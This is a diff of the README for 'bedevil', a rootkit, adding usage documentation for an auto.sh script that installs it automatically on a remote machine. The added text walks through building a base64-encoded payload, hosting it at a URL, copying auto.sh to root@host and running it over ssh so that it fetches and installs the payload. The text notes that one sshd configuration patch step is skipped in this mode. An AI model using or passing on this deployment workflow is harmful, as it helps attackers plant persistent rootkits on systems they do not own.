@@ -1,4 +1,5 @@
 
+
 # bedevil
 
 <img src="https://i.imgur.com/PyO00vy.png">
@@ -25,7 +26,7 @@
 
 </hr>
 
-## bedevil.sh
+## `bedevil.sh`
 ```
 $ ./bedevil.sh -h
 
@@ -65,6 +66,35 @@ $ ./bedevil.sh -h
      * Compressing: `BD_UNAME=myuname BD_PWD=mypassword ... ./bedevil.sh -vzd`
      * Using tarball: `TARBALL=./pathto.tar.gz ./bedevil.sh ...`
      * i.e.: `TARBALL=./pathto.tar.gz ./bedevil.sh -i/-c`
+
+
+## `auto.sh`
+```
+$ ./auto.sh
+
+Usage: ./auto.sh <option> <path or url>
+    Specified file must be the base64 result of
+    compressing bdvl's new include directory with
+    tar gzip upon completing configuration.
+
+    Options: -u: Download and use a file from online.
+             -l: Use a file on the local filesystem.
+
+```
+ * Automatic and instantaneous installation script for use with preconfigured installations.
+ * Specified file must be the resulting base64 encoded tar.gz archive created after `bedevil.sh -zd`.
+   * Use a file available locally, or give a URL to said file.
+   * File is written as base64 by bedevil.sh for the sake of easier transfers between machines.
+ * This script depends solely on the contents and the format of the 'settings' file within the compressed include directory.
+ * Additionally, there should be no need to edit anything within `auto.sh`.
+
+### Full example installation using `auto.sh` after `bedevil.sh`
+ * `BD_UNAME=[...] BD_PWD=[...] [...] ./bedevil.sh -vdz`
+ * Then upload resulting new \*.so.inc.b64 somewhere. In this case, 'https://lmao.rofl/libsydflm.so.inc.b64'
+ * `scp auto.sh root@host:/tmp/ && ssh root@host 'bash /tmp/auto.sh https://lmao.rofl/libsydflm.so.inc.b64'`
+ * Rootkit will then be installed as per usual, just in a fraction of the time compared to before.
+   * One slight issue is that the `patch_sshdconfig` function in `etc/postinstall.sh` doesn't get executed.
+   * Small price to pay & if that's such an issue you can do it yourself.
 
 </hr>
 
